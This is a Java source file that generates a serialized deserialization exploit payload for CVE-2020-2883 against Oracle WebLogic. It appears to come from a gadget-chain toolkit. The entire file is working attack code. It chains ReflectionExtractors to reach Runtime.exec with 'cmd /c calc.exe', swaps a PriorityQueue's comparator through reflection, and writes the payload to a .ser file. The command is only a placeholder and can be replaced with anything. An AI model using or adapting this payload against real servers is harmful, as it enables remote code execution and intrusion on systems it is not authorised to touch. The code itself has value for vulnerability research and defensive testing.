package GadGet.Weblogic;

import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import Commons.*;

import java.io.IOException;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class cve_2020_2883 {

    public static void cve_2020_2883(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        String cmd = "calc.exe";
        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                new ReflectionExtractor("getMethod", new Object[]{
                        "getRuntime", new Class[0]
                }),
                new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                new ReflectionExtractor("exec", new Object[]{new String[]{"cmd", "/c", cmd}})
        };
        ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractors);


        PriorityQueue priorityQueue = new PriorityQueue();


        priorityQueue.add("1");
        priorityQueue.add("1");

        ExtractorComparator extractorComparator = new ExtractorComparator();
        Field field = extractorComparator.getClass().getDeclaredField("m_extractor");
        field.setAccessible(true);
        field.set(extractorComparator, chainedExtractor);
        Field field1 = priorityQueue.getClass().getDeclaredField("comparator");
        field1.setAccessible(true);
        field1.set(priorityQueue, extractorComparator);

        Field field2 = priorityQueue.getClass().getDeclaredField("queue");
        field2.setAccessible(true);
        Object[] o = (Object[]) field2.get(priorityQueue);
        o[0] = Runtime.class;
        o[1] = "1";

        Serializer1.serializer("resourse/cve_2020_2883.ser",priorityQueue);
    }
}